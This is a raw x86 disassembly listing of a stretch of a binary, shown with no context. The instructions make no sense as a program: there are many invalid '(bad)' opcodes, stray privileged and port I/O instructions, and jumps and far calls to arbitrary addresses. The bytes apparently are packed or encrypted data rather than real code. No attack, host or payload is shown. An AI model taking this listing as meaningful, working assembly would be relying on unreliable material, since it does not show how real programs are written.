  41b5e6:	xchg   esi,eax
  41b5e7:	add    dl,al
  41b5e9:	lahf   
  41b5ea:	pop    eax
  41b5eb:	xor    dl,BYTE PTR [eax+eax*4-0x21]
  41b5ef:	loop   0x41b668
  41b5f1:	push   es
  41b5f2:	dec    ecx
  41b5f3:	add    dh,bh
  41b5f5:	shl    BYTE PTR [ebx+0x8],0x45
  41b5f9:	ins    BYTE PTR es:[edi],dx
  41b5fa:	mov    gs,WORD PTR [esi]
  41b5fc:	adc    BYTE PTR [ecx+0x46de30de],0x7d
  41b603:	lods   eax,DWORD PTR ds:[esi]
  41b604:	aaa    
  41b605:	cwde   
  41b606:	or     BYTE PTR [eax-0x47e94dcc],al
  41b60c:	mov    esp,0x19877c87
  41b611:	jecxz  0x41b633
  41b613:	stos   BYTE PTR es:[edi],al
  41b614:	inc    esi
  41b615:	mov    DWORD PTR [ecx-0x67e5ece3],ecx
  41b61b:	loopne 0x41b68e
  41b61d:	dec    esi
  41b61e:	popa   
  41b61f:	xchg   edx,eax
  41b620:	fisub  DWORD PTR [ebx+0x2]
  41b623:	outs   dx,BYTE PTR ds:[esi]
  41b624:	sahf   
  41b625:	add    dl,BYTE PTR [ebp+0x4bafdbdb]
  41b62b:	shl    BYTE PTR [ebx-0x6ab7e963],cl
  41b631:	popf   
  41b632:	neg    al
  41b634:	push   esi
  41b635:	aas    
  41b636:	jmp    0x41b605
  41b638:	push   ecx
  41b639:	inc    edx
  41b63a:	mov    esp,0xd1e80500
  41b63f:	push   ebp
  41b640:	and    cl,BYTE PTR [eax-0x69]
  41b643:	dec    edx
  41b644:	cmp    bl,al
  41b646:	jmp    0xd1e67bf2
  41b64b:	es mov dl,0xb2
  41b64e:	mov    eax,ds:0xfdf98442
  41b653:	pop    ecx
  41b654:	sub    esp,DWORD PTR [ecx-0x80]
  41b657:	pop    ecx
  41b658:	(bad)  
  41b659:	shl    DWORD PTR [edx-0x5a],0xe7
  41b65d:	xor    cl,BYTE PTR [esi-0x35]
  41b660:	lods   al,BYTE PTR ds:[esi]
  41b661:	sub    eax,0xd744331d
  41b666:	lods   eax,DWORD PTR ds:[esi]
  41b667:	pop    esp
  41b668:	enter  0xfc6f,0xe1
  41b66c:	and    al,BYTE PTR [esi-0x45892e93]
  41b672:	daa    
  41b673:	jg     0x41b69f
  41b675:	out    dx,al
  41b676:	je     0x41b5fa
  41b678:	test   DWORD PTR [esp+ebx*8],esp
  41b67b:	outs   dx,DWORD PTR ds:[esi]
  41b67c:	call   0xd5c8e16e
  41b681:	jmp    0xfe1fdef0
  41b686:	and    al,0xca
  41b688:	fs mov esp,0x5c2184ef
  41b68e:	lds    edx,FWORD PTR [ebx+edx*1]
  41b691:	aaa    
  41b692:	mov    edx,esp
  41b694:	and    dl,BYTE PTR [ebx+edx*1+0x7b1da032]
  41b69b:	test   DWORD PTR [esi],esi
  41b69d:	push   es
  41b69e:	adc    ebx,DWORD PTR [eax-0x1e4c0b42]
  41b6a4:	mov    dl,0x13
  41b6a6:	aaa    
  41b6a7:	mov    al,0x15
  41b6a9:	(bad)  
  41b6aa:	mov    eax,0xaa8e260b
  41b6af:	push   es
  41b6b0:	dec    edi
  41b6b1:	int3   
  41b6b2:	lahf   
  41b6b3:	add    al,0xb6
  41b6b5:	xchg   edx,eax
  41b6b6:	loope  0x41b6b7
  41b6b8:	mov    esi,0x7d141e42
  41b6bd:	les    ebx,FWORD PTR ds:0xb9d886e6
  41b6c3:	mov    bh,0xb8
  41b6c5:	mov    ss,ecx
  41b6c7:	(bad)  
  41b6c8:	ins    BYTE PTR es:[edi],dx
  41b6c9:	lea    edi,ds:0x465032a2
  41b6cf:	inc    esp
  41b6d0:	mov    dl,0x6d
  41b6d2:	cdq    
  41b6d3:	stos   BYTE PTR es:[edi],al
  41b6d4:	pop    esp
  41b6d5:	xor    eax,0xe38c27b7
  41b6da:	xor    dh,BYTE PTR [eax+0x3c13309]
  41b6e0:	(bad)  
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x72a9970a]
  41b6f4:	jno    0x41b67c
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b716
  41b6ff:	pop    DWORD PTR ds:[eax]
  41b702:	sub    al,0x86
  41b704:	or     DWORD PTR [edx+0x49],edx
  41b707:	test   DWORD PTR [eax-0x1fd14cbb],0x3c31a0fb
  41b711:	shr    DWORD PTR [edi-0x1bc9a334],0x18
  41b718:	xor    ebp,DWORD PTR [ebp+0x70]
  41b71b:	or     BYTE PTR [edx-0x1433045d],0xd
  41b722:	pop    ecx
  41b723:	jmp    0x6d:0xbcf0cd07
  41b72a:	mov    al,0x54
  41b72c:	and    al,0x8d
  41b72e:	xchg   BYTE PTR [edx+0x1b],dl
  41b731:	mov    ecx,0xf983ddf1
  41b736:	mov    ds:0x30bed1c,al
  41b73b:	(bad)  
  41b73c:	retf   0xf677
  41b73f:	sbb    eax,0x64ab9ba3
  41b744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b745:	mov    ds:0xcc9c1669,al
  41b74a:	pop    DWORD PTR [ebp-0x6c]
  41b74d:	(bad)  
  41b74e:	jge    0x41b7a2
  41b750:	inc    eax
  41b751:	cmc    
  41b752:	mov    al,ds:0x541836aa
  41b757:	or     eax,0xdc4eafe9
  41b75c:	clc    
  41b75d:	fwait
  41b75e:	movaps xmm3,XMMWORD PTR [esp+esi*4+0x68]
  41b763:	xchg   BYTE PTR [ecx+0x7],cl
  41b766:	inc    esi
  41b767:	out    dx,al
  41b768:	pop    esi
  41b769:	(bad)  
  41b76a:	hlt    
  41b76b:	sub    ah,ch
  41b76d:	test   BYTE PTR [eax-0x6c],dh
  41b770:	daa    
  41b771:	pusha  
  41b772:	stos   DWORD PTR es:[edi],eax
  41b773:	push   0x4a58fe9b
  41b778:	jl     0x41b7d2
  41b77a:	inc    edi
  41b77b:	out    0x4c,eax
  41b77d:	sub    DWORD PTR [edx+0x332ecb68],ecx
  41b783:	lods   al,BYTE PTR ds:[esi]
  41b784:	mov    eax,ds:0xeefdba23
  41b789:	push   edx
  41b78a:	mov    cl,0x6f
  41b78c:	push   esp
  41b78d:	sub    al,0x56
  41b78f:	mov    ecx,0xbf327d2e
  41b794:	inc    ebx
  41b795:	dec    ecx
  41b796:	sub    edx,edi
  41b798:	aad    0x11
  41b79a:	out    dx,eax
  41b79b:	(bad)  
  41b79c:	in     al,0x38
  41b79e:	frstor [ebx-0x25c59ba6]
  41b7a4:	add    al,0x1b
  41b7a6:	inc    ebx
  41b7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7a8:	loope  0x41b7d9
  41b7aa:	xor    BYTE PTR [ecx+0x38],dl
  41b7ad:	mov    ah,0x34
  41b7af:	(bad)  
  41b7b0:	or     DWORD PTR [edx-0x18],esp
  41b7b3:	mov    bh,0xc
  41b7b5:	sbb    bl,BYTE PTR [ebx-0x50]
  41b7b8:	dec    esi
  41b7b9:	mov    dl,0x14
  41b7bb:	jp     0x41b7d5
  41b7bd:	adc    esp,0xc2b88848
  41b7c3:	sbb    ebp,DWORD PTR [eax+edi*2+0x60]
  41b7c7:	inc    edx
  41b7c8:	dec    esi
  41b7c9:	(bad)  
  41b7ca:	rol    DWORD PTR [ebp+0x32],1
  41b7cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7ce:	xlat   BYTE PTR ds:[ebx]
  41b7cf:	ret    
  41b7d0:	cmp    BYTE PTR fs:[ebp+0x5d],al
  41b7d4:	clc    
  41b7d5:	shr    BYTE PTR [edi+0x20],1
  41b7d8:	daa    
  41b7d9:	mov    DWORD PTR [edx+edi*2+0x662adb15],eax
  41b7e0:	add    ebx,DWORD PTR [eax-0x24717f7e]
  41b7e6:	add    eax,0x1d15ae38
  41b7eb:	sbb    bl,BYTE PTR [edx+0x53]
  41b7ee:	call   0x6137:0x54a6d247
  41b7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f7:	(bad)  
  41b7f8:	xchg   ebp,eax
  41b7f9:	fs cmp dh,0xc9
  41b7fd:	call   0xdb0f:0x1778ed38
  41b804:	sub    esi,eax
  41b806:	loopne 0x41b825
  41b808:	jnp    0x41b822
  41b80a:	sub    DWORD PTR ds:[edi+esi*1+0x25],ebx
  41b80f:	shl    BYTE PTR [ebp+0x14],0x48
  41b813:	call   0x3db5a1bd
  41b818:	repnz ror BYTE PTR [esp+edi*1+0x1a1dff51],0xf7
  41b821:	mov    WORD PTR [ebx-0x407c245b],es
  41b827:	push   es
  41b828:	addr16 dec ebx
  41b82a:	ins    DWORD PTR es:[edi],dx
  41b82b:	push   es
  41b82c:	mov    dl,0x32
  41b82e:	jb     0x41b8a9
  41b830:	inc    ebp
  41b831:	or     al,BYTE PTR [ecx+0xd]
  41b834:	ss into 
  41b836:	or     al,0xd
  41b838:	icebp  
  41b839:	stc    
  41b83a:	xchg   edi,eax
  41b83b:	out    dx,al
  41b83c:	int    0x2
  41b83e:	nop
  41b83f:	sbb    al,BYTE PTR [ecx-0x7d1087a7]
  41b845:	fimul  DWORD PTR [esi-0x51]
  41b848:	mov    esp,0x60c31a74
  41b84d:	lock and DWORD PTR [eax],esi
  41b850:	pop    ss
  41b851:	(bad)  
  41b852:	xchg   ax,ax
  41b854:	mov    eax,ds:0x4b05acd9
  41b859:	inc    ecx
  41b85a:	call   0xfdc5:0x3c33a8d
  41b861:	adc    BYTE PTR [ebx-0x4e],al
  41b864:	aas    
  41b865:	mov    bh,0x83
  41b867:	idiv   ecx
  41b869:	or     ah,BYTE PTR [ebx-0x585556cb]
  41b86f:	jo     0x41b823
  41b871:	pop    eax
  41b872:	(bad)  
  41b873:	idiv   DWORD PTR [ebp+eax*1+0x2f]
  41b877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b878:	inc    esi
  41b879:	call   0x351871ed
  41b87e:	mov    DWORD PTR [ecx+0x5bc68572],eax
  41b884:	cmp    dh,BYTE PTR [edi-0x76]
  41b887:	jo     0x41b81d
  41b889:	add    DWORD PTR [esp+ebp*1-0x2427cff6],edx
  41b890:	mov    bh,0x4c
  41b892:	ficomp DWORD PTR [edi]
  41b894:	pop    ebp
  41b895:	ret    0x6c45
  41b898:	lahf   
  41b899:	idiv   BYTE PTR [ebp+0x58]
  41b89c:	push   eax
  41b89d:	mov    al,dh
  41b89f:	push   0x46
  41b8a1:	out    0x6e,eax
  41b8a3:	in     eax,dx
  41b8a4:	pop    esp
  41b8a5:	mov    ch,0xf4
  41b8a7:	call   0xa1f4:0x764a54e1
  41b8ae:	inc    esi
  41b8af:	fisttp WORD PTR [eax+0x4ad2ddac]
  41b8b5:	ds xor eax,0xf6ee36e1
  41b8bb:	push   edi
  41b8bc:	fild   WORD PTR [esi]
  41b8be:	mov    esp,0x289befd2
  41b8c3:	sbb    BYTE PTR [ebp+ecx*2+0x3a],bh
  41b8c7:	imul   ebx,DWORD PTR [ecx-0x77f51ff9],0x66dc713b
  41b8d1:	push   ds
  41b8d2:	sbb    al,0x2a
  41b8d4:	icebp  
  41b8d5:	dec    ebx
  41b8d6:	ss das 
  41b8d8:	cli    
  41b8d9:	in     al,dx
  41b8da:	sub    ecx,DWORD PTR [esi]
  41b8dc:	mov    bh,ah
  41b8de:	mov    bh,0x78
  41b8e0:	sbb    ebx,DWORD PTR [eax]
  41b8e2:	dec    edx
  41b8e3:	aas    
  41b8e4:	ficomp DWORD PTR [esi+0x4936ee85]
  41b8ea:	sar    BYTE PTR ds:0x241c8e77,cl
  41b8f0:	inc    ecx
  41b8f1:	push   ecx
  41b8f2:	rcl    BYTE PTR [ecx+0x181088d6],0x92
  41b8f9:	add    eax,0x94139d7d
  41b8fe:	mov    dl,0xce
  41b900:	ja     0x41b8d7
  41b902:	inc    edi
  41b903:	jge    0x41b8f6
  41b905:	faddp  st(3),st
  41b907:	jne    0x41b961
  41b909:	push   ebx
  41b90a:	adc    cl,bh
  41b90c:	sub    DWORD PTR [ebx+0x10],0x93dd4be
  41b913:	shl    DWORD PTR [ecx+0x2af0f55],0x8b
  41b91a:	push   ebp
  41b91b:	cld    
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x9d3deca]
  41b92f:	sub    ch,BYTE PTR [eax+esi*8-0x1a]
  41b933:	jg     0x41b9ad
  41b935:	adc    BYTE PTR [esi+0x78],bh
  41b938:	js     0x41b8fd
  41b93a:	mov    ebp,0x91715c71
  41b93f:	dec    eax
  41b940:	mov    dh,0xce
  41b942:	popf   
  41b943:	sti    
  41b944:	retf   
  41b945:	jl     0x41b958
  41b947:	out    dx,eax
  41b948:	lods   al,BYTE PTR ds:[esi]
  41b949:	mov    bl,0xb
  41b94b:	fcmovnu st,st(5)
  41b94d:	cmp    al,BYTE PTR [esi+0xa4a9da]
  41b953:	pop    esp
  41b954:	mov    al,dl
  41b956:	xchg   DWORD PTR [eax-0x2b],ebx
  41b959:	inc    edi
  41b95a:	or     esp,edx
  41b95c:	dec    edi
  41b95d:	xchg   edi,eax
  41b95e:	and    eax,0x86a9a332
  41b963:	loopne 0x41b9c1
  41b965:	mov    bh,0xb8
  41b967:	cdq    
  41b968:	inc    edi
  41b969:	pop    ds
  41b96a:	or     BYTE PTR [esp+eiz*4+0x6e],ch
  41b96e:	les    eax,FWORD PTR [esi-0x3aa3fe23]
  41b974:	test   al,0x6a
  41b976:	add    BYTE PTR ss:[eax],ch
  41b979:	fnstcw WORD PTR [esi-0x60]
  41b97c:	adc    BYTE PTR [esi-0x73417861],dh
  41b982:	sub    al,0x27
  41b984:	nop
  41b985:	shl    BYTE PTR [ebx+0x0],0xa3
  41b989:	cld    
  41b98a:	xchg   ebp,eax
  41b98b:	test   eax,0x8da37c9
  41b990:	leave  
  41b991:	out    dx,al
  41b992:	dec    esp
  41b993:	aaa    
  41b994:	cwde   
  41b995:	cwde   
  41b996:	sbb    eax,0x14beac9c
  41b99b:	pop    ecx
  41b99c:	sub    DWORD PTR [edx],esp
  41b99e:	test   BYTE PTR [edi+0x5b],ah
  41b9a1:	bound  ebx,QWORD PTR [edi+0x77]
  41b9a4:	push   0x29
  41b9a6:	inc    eax
  41b9a7:	pop    es
  41b9a8:	ret    0xec69
  41b9ab:	jmp    0x41b9cb
  41b9ad:	inc    BYTE PTR [edi+0x3650cd8e]
  41b9b3:	pop    edi
  41b9b4:	jnp    0x41b9b8
  41b9b6:	dec    esp
  41b9b7:	inc    esi
  41b9b8:	cmp    ebx,esi
  41b9ba:	xor    ch,BYTE PTR [edi+0x66d58d91]
  41b9c0:	or     BYTE PTR [esi],ah
  41b9c2:	jg     0x41ba37
  41b9c4:	dec    eax
  41b9c5:	fcomip st,st(2)
  41b9c7:	cmp    esi,ecx
  41b9c9:	inc    edx
  41b9ca:	fisttp QWORD PTR [ecx]
  41b9cc:	inc    esp
  41b9cd:	stos   BYTE PTR es:[edi],al
  41b9ce:	mov    dh,0x70
  41b9d0:	mov    al,0x40
  41b9d2:	repnz ror BYTE PTR [eax-0x44],1
  41b9d6:	call   0x50d4d030
  41b9db:	lods   eax,DWORD PTR ds:[esi]
  41b9dc:	mov    edi,0x98109294
  41b9e1:	bts    DWORD PTR [ebp+0xc975f84],edx
  41b9e8:	pop    eax
  41b9e9:	(bad)  
  41b9ea:	dec    esi
  41b9eb:	mov    esi,0xe3f3a944
  41b9f0:	mov    BYTE PTR [eax+0x2],ch
  41b9f3:	pop    esi
  41b9f4:	int3   
  41b9f5:	(bad)  
  41b9f6:	pop    ebx
  41b9f7:	das    
  41b9f8:	in     al,0xe
  41b9fa:	je     0x41b9bb
  41b9fc:	push   ecx
  41b9fd:	and    ch,BYTE PTR [edx+ebp*1]
  41ba00:	call   0x1d3aa47b
  41ba05:	sub    eax,0xc68263ed
  41ba0a:	lods   eax,DWORD PTR ds:[esi]
  41ba0b:	sti    
  41ba0c:	outs   dx,BYTE PTR ds:[esi]
  41ba0d:	mov    bl,0x25
  41ba0f:	loope  0x41ba07
  41ba11:	cmp    al,0xde
  41ba13:	adc    bh,BYTE PTR [esp+esi*2]
  41ba16:	ss mov ah,0x3a
  41ba19:	loopne 0x41ba22
  41ba1b:	xor    si,0xb150
  41ba20:	sar    ebp,cl
  41ba22:	test   al,0x15
  41ba24:	aam    0x86
  41ba26:	or     DWORD PTR [eax+0x590eb897],esi
  41ba2c:	fs ret 
  41ba2e:	stos   DWORD PTR es:[edi],eax
  41ba2f:	outs   dx,BYTE PTR ds:[esi]
  41ba30:	idiv   DWORD PTR gs:[edx]
  41ba33:	mov    cl,0xf1
  41ba35:	hlt    
  41ba36:	mov    esi,esp
  41ba38:	push   ds
  41ba39:	push   0xffffffce
  41ba3b:	mov    ds:0xe930fd00,al
  41ba40:	(bad)  
  41ba41:	sbb    ebx,eax
  41ba43:	xchg   edi,eax
  41ba44:	lds    ebp,FWORD PTR [ecx-0x3f]
  41ba47:	or     dl,al
  41ba49:	lds    esi,FWORD PTR [esi]
  41ba4b:	adc    DWORD PTR [ebx],eax
  41ba4d:	(bad)  
  41ba4f:	in     al,0x3c
  41ba51:	and    edi,esp
  41ba53:	jae    0x41ba33
  41ba55:	out    dx,al
  41ba56:	adc    al,0x73
  41ba58:	cmp    DWORD PTR [eax],ebx
  41ba5a:	cmp    BYTE PTR [edx],ch
  41ba5c:	push   eax
  41ba5d:	cdq    
  41ba5e:	test   BYTE PTR [esi],bh
  41ba60:	mov    al,0xbc
  41ba62:	jbe    0x41bab8
  41ba64:	xor    esi,DWORD PTR [esi-0xc5035f3]
  41ba6a:	push   0x1e
  41ba6c:	ja     0x41bacd
  41ba6e:	shr    BYTE PTR [esi-0x681424c8],1
  41ba74:	cmp    eax,0x85f718c5
  41ba79:	(bad)  
  41ba7a:	mov    esi,0xc83110c7
  41ba7f:	pop    ebx
  41ba80:	test   al,0xc3
  41ba82:	mov    al,BYTE PTR [edx]
  41ba84:	(bad)  
  41ba85:	scas   al,BYTE PTR es:[edi]
  41ba86:	and    DWORD PTR [ebx],eax
  41ba88:	test   eax,0x936bd7e3
  41ba8d:	adc    eax,DWORD PTR [esi+eax*1-0x3e]
  41ba91:	inc    ecx
  41ba92:	in     al,dx
  41ba93:	es sbb al,0xe5
  41ba96:	test   DWORD PTR [edi+0x61055241],esi
  41ba9c:	add    al,0x88
  41ba9e:	ins    DWORD PTR es:[edi],dx
  41ba9f:	mov    ebx,0xbbff0785
  41baa4:	pop    ebx
  41baa5:	fistp  QWORD PTR [edi+0x6a2e49ab]
  41baab:	pop    esp
  41baac:	aaa    
  41baad:	pop    edi
  41baae:	or     BYTE PTR [ebx+0x5fc9595b],ch
  41bab4:	xchg   DWORD PTR [esi],ebp
  41bab6:	gs dec esi
  41bab8:	not    bh
  41baba:	mov    ds:0x1e3903cb,eax
  41babf:	dec    ebx
  41bac0:	adc    BYTE PTR [edx],bl
  41bac2:	daa    
  41bac3:	out    dx,eax
  41bac4:	in     al,dx
  41bac5:	and    DWORD PTR [eax-0x39d6dad6],ebx
  41bacb:	arpl   WORD PTR ds:0xe856ebdb,dx
  41bad1:	xlat   BYTE PTR ds:[ebx]
  41bad2:	or     al,0x5b
  41bad4:	loopne 0x41bafa
  41bad6:	or     al,0x3a
  41bad8:	(bad)  
  41bad9:	dec    esi
  41bada:	adc    edi,ebp
  41badc:	adc    al,0x59
  41bade:	shl    DWORD PTR [edi+eiz*8-0x463db03c],0x4a
  41bae6:	repnz or DWORD PTR [edx+edi*4],esi
  41baea:	or     ebx,DWORD PTR [ebp-0x172d7966]
  41baf0:	cmp    eax,0x9540d6ec
  41baf5:	push   esp
  41baf6:	repnz stc 
  41baf8:	iret   
  41baf9:	fild   DWORD PTR [esi+ebp*8]
  41bafc:	push   eax
  41bafd:	dec    edi
  41bafe:	sbb    eax,0x82616acc
  41bb03:	fsin   
  41bb05:	xor    esi,DWORD PTR [eax-0x25]
  41bb08:	mov    ebp,0x98d6da0e
  41bb0d:	push   esp
  41bb0e:	xchg   BYTE PTR [ecx-0x1a],al
  41bb11:	pop    ebx
  41bb13:	repnz mov dh,0xdc
  41bb16:	not    edi
  41bb18:	pop    edi
  41bb19:	jmp    0x41bb4a
  41bb1b:	into   
  41bb1c:	loope  0x41bb5b
  41bb1e:	popf   
  41bb1f:	leave  
  41bb20:	mov    esi,0xe96c5bbd
  41bb25:	or     bl,ch
  41bb27:	arpl   WORD PTR [esi+0x6688b062],ax
  41bb2d:	cld    
  41bb2e:	test   BYTE PTR [eax+edi*8+0x2d],0x6e
  41bb33:	outs   dx,DWORD PTR ds:[esi]
  41bb34:	fisttp DWORD PTR [eax+0x4c2fcd57]
  41bb3a:	fdivr  st(4),st
  41bb3c:	mov    cl,0x35
  41bb3e:	inc    edx
  41bb3f:	add    eax,0xb36cec84
  41bb44:	mov    bl,BYTE PTR [ebx-0x47]
  41bb47:	pop    esp
  41bb48:	jne    0x41bba9
  41bb4a:	or     eax,0xc359d1d1
  41bb4f:	push   0xe9d133da
  41bb54:	xor    BYTE PTR [edx],al
  41bb56:	add    BYTE PTR [eax],al
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xc017bf12
  41bb65:	pop    ebp
  41bb66:	xchg   edx,eax
  41bb67:	add    al,0x88
  41bb69:	in     al,0x7f
  41bb6b:	js     0x41bb7d
  41bb6d:	jle    0x41bbe7
  41bb6f:	js     0x41bb94
  41bb71:	nop
  41bb72:	enter  0xbea0,0x3d
  41bb76:	cmp    esp,DWORD PTR [edi-0x40]
  41bb79:	pop    ebp
  41bb7a:	push   cs
  41bb7b:	mov    al,ds:0xd0312bb8
  41bb80:	leave  
  41bb81:	push   0x2bfd3d11
  41bb86:	push   ebp
  41bb87:	int3   
  41bb88:	mov    dl,0xd
  41bb8a:	add    al,0x53
  41bb8c:	stos   BYTE PTR es:[edi],al
  41bb8d:	xchg   esp,eax
  41bb8e:	sbb    BYTE PTR [edx],al
  41bb90:	jb     0x41bbc5
  41bb92:	cmc    
  41bb93:	cli    
  41bb94:	data16 mov al,ds:0x8e5ee762
  41bb9a:	in     eax,dx
  41bb9b:	mov    esp,0x934c71e4
  41bba0:	(bad)  
  41bba1:	clc    
  41bba2:	ret    
  41bba3:	test   DWORD PTR [edx+edi*1+0x48261537],esi
  41bbaa:	mov    esi,0x887fe3c9
  41bbaf:	or     edx,edx
  41bbb1:	cmp    eax,0xdf9c834b
  41bbb6:	aas    
  41bbb7:	and    al,0xc5
  41bbb9:	loopne 0x41bbcf
  41bbbb:	pop    esi
  41bbbc:	popa   
  41bbbd:	fs pop eax
  41bbbf:	sbb    dh,BYTE PTR [ecx]
  41bbc1:	inc    edi
  41bbc2:	adc    esp,DWORD PTR [ebx+edx*8-0x21]
  41bbc6:	dec    ebp
  41bbc7:	push   ecx
  41bbc8:	hlt    
  41bbc9:	fbstp  TBYTE PTR [ebp-0x12]
  41bbcc:	retf   
  41bbcd:	test   eax,0x87d6a081
  41bbd2:	mov    eax,ds:0xbfab29b9
  41bbd7:	in     al,0xb
  41bbd9:	aam    0x90
  41bbdb:	xchg   ebp,eax
  41bbdc:	leave  
  41bbdd:	jp     0x41bc34
  41bbdf:	iret   
  41bbe0:	mov    gs:0x7ee7ad60,al
  41bbe6:	in     al,0xcc
  41bbe8:	(bad)
  41bbeb:	cmp    DWORD PTR [ebx-0x21],eax
  41bbee:	add    ecx,DWORD PTR [eax]
  41bbf0:	inc    ebx
  41bbf1:	jbe    0x41bc44
  41bbf3:	mov    bh,0xdb
  41bbf5:	sub    dl,BYTE PTR [edx]
  41bbf7:	xchg   esp,esp
  41bbf9:	iret   
  41bbfa:	sub    BYTE PTR [edx+0x6b],ch
  41bbfd:	jg     0x41bc46
  41bbff:	ins    BYTE PTR es:[edi],dx
  41bc00:	fwait
  41bc01:	adc    edx,esp
  41bc03:	es sbb al,0xf7
  41bc06:	push   esi
  41bc07:	faddp  st(2),st
  41bc09:	cli    
  41bc0a:	sbb    BYTE PTR [ecx-0x7e],ch
  41bc0d:	(bad)  
  41bc0e:	out    0xf1,al
  41bc10:	xchg   esi,eax
  41bc11:	cmp    eax,0xa4a999b8
  41bc16:	clc    
  41bc17:	fisttp QWORD PTR [esi]
  41bc19:	retf   0xdaf2
  41bc1c:	jl     0x41bc08
  41bc1e:	xchg   ebx,eax
  41bc1f:	in     eax,0xa0
  41bc21:	aaa    
  41bc22:	mov    cl,0x29
  41bc24:	xchg   dl,ah
  41bc26:	es inc edx
  41bc28:	fnsave [eax+0x57dc0035]
  41bc2e:	call   0xc28f:0x72bca060
  41bc35:	push   ds
  41bc36:	ds leave 
  41bc38:	mov    edi,eax
  41bc3a:	xchg   ecx,eax
  41bc3b:	(bad)  
  41bc3c:	jmp    0x41bbf4
  41bc3e:	daa    
  41bc3f:	in     eax,0x6e
  41bc41:	ret    
  41bc42:	mov    bh,0xd1
  41bc44:	cdq    
  41bc45:	adc    al,0x12
  41bc47:	daa    
  41bc48:	shl    BYTE PTR [esi-0x519e9ca4],1
  41bc4e:	mov    ds:0x164222bc,eax
  41bc53:	xchg   DWORD PTR [esi+edx*1+0x4f],ebx
  41bc57:	lock jp 0x41bcc7
  41bc5a:	inc    esp
  41bc5b:	icebp  
  41bc5c:	inc    dh
  41bc5e:	pop    ebp
  41bc5f:	sub    al,0x56
  41bc61:	jge    0x41bcac
  41bc63:	out    0xf8,eax
  41bc65:	addr16 sbb eax,0xc1905eb1
  41bc6b:	(bad)  
  41bc6c:	loopne 0x41bc04
  41bc6e:	dec    ebp
  41bc6f:	xchg   ecx,eax
  41bc70:	je     0x41bc37
  41bc72:	outs   dx,DWORD PTR ds:[esi]
  41bc73:	out    dx,al
  41bc74:	(bad)  
  41bc75:	inc    esp
  41bc76:	mov    edi,0x794fb67b
  41bc7b:	adc    bh,ch
  41bc7d:	and    eax,0x5f39dd4c
  41bc82:	jne    0x41bc61
  41bc84:	test   al,0x92
  41bc86:	das    
  41bc87:	push   ebp
  41bc88:	mov    dh,0x95
  41bc8a:	push   edi
  41bc8b:	ins    BYTE PTR es:[edi],dx
  41bc8c:	jne    0x41bcb6
  41bc8e:	test   BYTE PTR [edx+0x6728f5c7],0xfe
  41bc95:	stos   BYTE PTR es:[edi],al
  41bc96:	in     eax,dx
  41bc97:	cli    
  41bc98:	mov    ah,0x86
  41bc9a:	das    
  41bc9b:	icebp  
  41bc9c:	leave  
  41bc9d:	xchg   ebp,eax
  41bc9e:	mov    eax,ds:0x8aa6e032
  41bca3:	push   es
  41bca4:	inc    eax
  41bca5:	pusha  
  41bca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bca7:	or     edi,DWORD PTR [eax+0x66]
  41bcaa:	test   BYTE PTR [ecx-0x28],0x45
  41bcae:	out    0xe0,al
  41bcb0:	repnz inc esp
  41bcb2:	jo     0x41bc54
  41bcb4:	aas    
  41bcb5:	pop    ecx
  41bcb6:	push   0xe7ec138
  41bcbb:	sub    eax,0x74a72968
  41bcc0:	inc    ebx
  41bcc1:	(bad)  
  41bcc2:	jo     0x41bcd5
  41bcc4:	out    dx,al
  41bcc5:	dec    ebp
  41bcc6:	jne    0x41bd1e
  41bcc8:	sbb    ebp,edx
  41bcca:	shl    BYTE PTR [ebp+0x37],0x2f
  41bcce:	adc    bl,cl
  41bcd0:	je     0x41bce0
  41bcd2:	or     DWORD PTR [edi+0x10],eax
  41bcd5:	daa    
  41bcd6:	or     DWORD PTR [edx+0x20],0x2315e92f
  41bcdd:	xchg   DWORD PTR [ebp+0x73],eax
  41bce0:	sbb    eax,0xc0bf623a
  41bce5:	loope  0x41bd5b
  41bce7:	call   0x9fa9:0x806bd2f4
  41bcee:	xchg   ebp,eax
  41bcef:	cli    
  41bcf0:	into   
  41bcf1:	test   DWORD PTR [ebp-0x4b49ff59],eax
  41bcf7:	sub    bl,0xc
  41bcfa:	push   esi
  41bcfb:	mov    cl,0x3b
  41bcfd:	int    0xef
  41bcff:	adc    al,BYTE PTR [edi]
  41bd01:	clc    
  41bd02:	pop    esp
  41bd03:	in     eax,dx
  41bd04:	inc    edi
  41bd05:	pop    edx
  41bd06:	dec    ecx
  41bd07:	lahf   
  41bd08:	cmp    eax,0xc0e3ebe4
  41bd0d:	and    BYTE PTR [eax+0x4adbe35e],0xcb
  41bd14:	inc    eax
  41bd15:	jae    0x41bc9e
  41bd17:	popaw  
  41bd19:	jmp    0xe7d963f3
  41bd1e:	push   0x9
  41bd20:	xor    eax,0x76c4224b
  41bd25:	cmp    ebp,DWORD PTR [edi]
  41bd27:	xchg   ecx,eax
  41bd28:	dec    ecx
  41bd29:	push   cs
  41bd2a:	cmp    edi,DWORD PTR [eax]
  41bd2c:	pop    ss
  41bd2d:	ja     0x41bcb6
  41bd2f:	clc    
  41bd30:	xchg   esp,eax
  41bd31:	in     eax,dx
  41bd32:	fmulp  st(3),st
  41bd34:	mov    ds:0x336d0ff3,al
  41bd39:	add    DWORD PTR [esi],0x4c
  41bd3c:	iret   
  41bd3d:	pop    esi
  41bd3e:	dec    eax
  41bd3f:	cwde   
  41bd40:	xor    cl,ah
  41bd42:	fs mov dl,0x77
  41bd45:	xchg   edi,eax
